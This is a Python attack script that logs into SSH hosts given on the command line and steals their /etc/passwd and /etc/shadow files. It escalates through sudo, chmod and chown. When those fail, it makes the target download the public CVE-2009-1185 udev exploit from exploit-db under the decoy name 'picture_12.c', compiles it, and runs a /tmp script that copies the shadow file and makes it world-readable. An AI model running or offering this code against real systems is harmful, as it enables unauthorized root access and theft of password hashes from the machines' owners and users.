import time,re,sys,argparse
try:
	from pexpect import pxssh
except:
	print('[!]Is pexpect installed ? Installation possible via pip for python3.x: pip3 install pexpect'+'\n'+
		'must use sudo if not root.')


def using_exploit(file):
	s.sendline('uname -s -r -v ')
	s.prompt()
	if '2.6' in s.before.decode():
		print('[>]Starting exploit attack using exploit CVE-2009-1185(https://www.exploit-db.com/exploits/8572/)')
		print('[>]Downloading exploit:')
		try:
			download = 'wget --no-check-certificate http://www.exploit-db.com/download/8572 -O picture_12.c'
			s.sendline(download)
			s.prompt()
		except Exception as e :
			print('[!]Error on download, exception details:',e)
		if "100%" in s.before.decode() and "saved" in s.before.decode():
			print('[>]Download successful')
		s.sendline('cat /proc/net/netlink')
		s.prompt()
		print(s.before.decode())
		print('The PID of the udev process should be the one which has a value higher than 0 or the highest on in the list,copy it and past it down here:')
		PID = input('udev PID:')
		s.sendline('> /tmp/run')
		s.prompt()
		list_commands = ["echo '#!/bin/bash' >> /tmp/run","echo 'cp /etc/shadow /tmp/shadow' >> /tmp/run","echo 'chmod 777 /tmp/shadow' >> /tmp/run"]
		for command in list_commands:	
			s.sendline(command)
			s.prompt()
		command = 'gcc picture_12.c -o picture12_code'
		s.sendline(command)
		s.prompt()
		s.sendline('./picture12_code '+str(PID))
		s.prompt()
		s.sendline('cat /tmp/shadow')
		s.prompt()
		print('\n','Output of shadow'+':'+'\n',s.before.decode())
		sys.exit('[>]Exploitation done. Closing program.')
	else:
		print('[!]Kernel version of the remote target is higher than 2.6. It is not affected by the exploit.')
		sys.exit('[!]An exploit for the version of the kernel could be found on the internet :https://www.exploit-db.com')

def Get_Files(file,output,password,username):
	if re.search('permission denied|Operation not permitted|rights',output,re.I) is not None:
		print('[>]Trying with sudo su - command.'+'\n')
		s.sendline('sudo su -')
		s.prompt()
		if re.search('password',str(s.before),re.I) is not None:
			s.sendline(password)
			s.prompt()
			s.sendline('cat '+file)
			s.prompt()
			print('\n','Output of '+file+':'+'\n',s.before.decode())
		elif re.search('permission denied|Operation not permitted|rights',str(s.before),re.I) is not None:
			print('[>]Trying with chmod command.'+'\n')
			s.sendline('sudo chmod a+wrx '+file)
			s.prompt()
			if re.search('password',str(s.before),re.I) is not None:
				s.sendline(password)
				s.prompt()
				s.sendline('cat '+file)
				s.prompt()
				print('\n','Output of '+file+':'+'\n',s.before.decode())
			elif re.search('permission denied|Operation not permitted|rights',s.before.decode(),re.I) is not None:
				print('[>]Trying with chown command.'+'\n')
				s.sendline('sudo chown '+username+' '+file)
				s.prompt()
				if re.search('permission denied|Operation not permitted|rights',s.before.decode(),re.I) is not None:
					print('[!]Not possible to get root rights to get '+file+'.Starting exploit attack using exploit CVE-2009-1185(https://www.exploit-db.com/exploits/8572/)')
					using_exploit(file)
				elif re.search('password',s.before.decode(),re.I) is not None:
					s.sendline(password)
					s.prompt()
					s.sendline('cat '+file)
					s.prompt()
					print('Output of '+file+':'+'\n',s.before.decode())
			else:
				print('[!]Not possible to get root rights to get '+file+'.Starting exploit attack using exploit CVE-2009-1185(https://www.exploit-db.com/exploits/8572/)')
				using_exploit(file)
		else:
			s.sendline('cat '+file)
			s.prompt()
			print('\n','Output of '+file+':'+'\n',s.before.decode())
	else:
		print('\n','Output of '+file+':'+'\n',s.before.decode())

def passwd_shadow(host,username,password):
	files = ['/etc/passwd','/etc/shadow']
	try:
		global s
		s = pxssh.pxssh()
		s.login(host, username, password)
		for file in files:
			print('[>]Trying with sudo command.'+'\n')
			s.sendline('sudo cat '+file)
			s.prompt()
			output = s.before.decode()
			if re.search('password',s.before.decode(),re.I) is not None:
				s.sendline(password)
				s.prompt()
				print('\n','Output of '+file+':'+'\n',s.before.decode())
			else:
				Get_Files(file,output,password,username)
	except pxssh.ExceptionPxssh as e:
		print("[!]Login failed.")
		print('[!]Exception details:',e)

def main_arguments():
	usage='.......DO IT WHEN HASH LESSON IS DONE BECAUSE MAYBE I will add some more features'
	parser = argparse.ArgumentParser(usage=usage)
	parser.add_argument('-hosts',help='Vulnerable ssh hosts.',nargs='+')
	parser.add_argument('-usernames',help='Usernames for vulnerable hosts.',nargs='+')
	parser.add_argument('-passwords',help='Passwords for vulnerable hosts.',nargs='+')
	arguments,unknown_arguments = parser.parse_known_args()
	if unknown_arguments:
		print('[!]Unknown arguments:',unknown_arguments)
	if arguments.hosts and arguments.usernames and arguments.passwords:
		total_hosts = 0
		for host in arguments.hosts:
			total_hosts = 1 + total_hosts
		for x in range(0,total_hosts):
			print('\n'+'Target:',arguments.hosts[x],arguments.usernames[x],arguments.passwords[x])
			passwd_shadow(arguments.hosts[x],arguments.usernames[x],arguments.passwords[x])
	else:
		print('[!]One or more aguments are not specified.')


main_arguments()


